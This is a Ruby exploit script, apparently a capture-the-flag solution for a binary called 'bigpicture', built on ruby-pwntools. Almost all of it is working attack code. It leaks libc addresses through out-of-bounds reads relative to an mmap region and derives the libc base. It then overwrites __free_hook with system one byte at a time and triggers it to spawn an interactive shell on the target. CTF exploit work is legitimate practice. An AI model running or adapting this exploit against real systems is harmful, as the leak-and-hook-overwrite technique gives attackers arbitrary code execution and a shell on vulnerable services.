#!/usr/bin/env ruby
# encoding: ascii-8bit
require 'pry'
require 'pwn'        # https://github.com/peter50216/ruby-pwntools
require 'heapinfo'   # https://github.com/david942j/heapinfo
require 'one_gadget' # https://github.com/david942j/one_gadget

# @magic = one_gadget(file: './libc.so.6')[0]

host, port = 'bigpicture.pwning.xxx', 420
@local = false
if ARGV.empty?
  port = 4220
  host = '127.0.0.1'; @local = true
else
  raise ArgumentError, 'host not set' if host.empty?
end
$z = Sock.new host, port
def z;$z;end
@p = 'bigpicture'
def h;@h ||= heapinfo(@p); @h.reload!;end
def elf; @elf ||= ELF.new(@p); end
#================= Exploit Start ====================

z.puts '135168 x 1'
# mmap 0x5c7000

@mmap_offset = 0x5c7010
unless @local
  @mmap_offset = 0x5c1010 # - ARGV[1].to_i*0x1000
  p @mmap_offset.hex
end

def leak(rel_libc_addr)
  z.puts "0 , #{-@mmap_offset + rel_libc_addr} , a"
  z.recvuntil 'overwriting '
  z.recvn(1)
end

def write(rel_libc_addr, chr)
  z.puts "0 , #{-@mmap_offset + rel_libc_addr} , #{chr}"
end

libc = ELF.new('./libc.so.6')
target = libc.symbols.__free_hook

t = ''
6.times do |i|
  t += leak(libc.symbols._IO_list_all + i)
end
t += "\x00\x00"
libc.address = u64(t) - 0x3c4540
h.offset(libc.address)

6.times do |i|
  write(target + i, libc.symbols.system.p64[i])
end

z.puts '0 , 0 , s'
z.puts '1 , 0 , h'

z.puts 'quit'

z.interact

